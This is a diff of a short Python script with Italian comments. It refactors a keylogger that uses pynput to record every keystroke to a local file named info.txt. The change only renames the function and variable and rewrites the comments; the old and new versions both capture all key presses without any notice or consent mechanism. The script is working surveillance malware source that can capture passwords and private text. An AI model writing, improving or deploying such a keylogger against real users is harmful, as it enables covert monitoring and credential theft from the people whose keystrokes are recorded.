@@ -1,14 +1,13 @@
-# importo la libreria pynput 
-from pynput.keyboard import Key, Listener
 import logging
+from pynput.keyboard import Key, Listener
 
-# registra tutte le info e salvale in un file chiamato info.txt
-logging.basicConfig(filename=("" + "info.txt"), level=logging.DEBUG)
+# Configura il percorso del file di log
+logging.basicConfig(filename="info.txt", level=logging.DEBUG)
 
-# definiamo una funzione chiamata reg_tasti
-def reg_tasti(key):
+# Definisci una funzione per registrare i tasti premuti
+def register_keys(key):
     logging.info(str(key))
 
-# rimani in ascolto
-with Listener(on_press=reg_tasti) as log:
-    log.join()
+# Rimani in ascolto dei tasti premuti
+with Listener(on_press=register_keys) as listener:
+    listener.join()
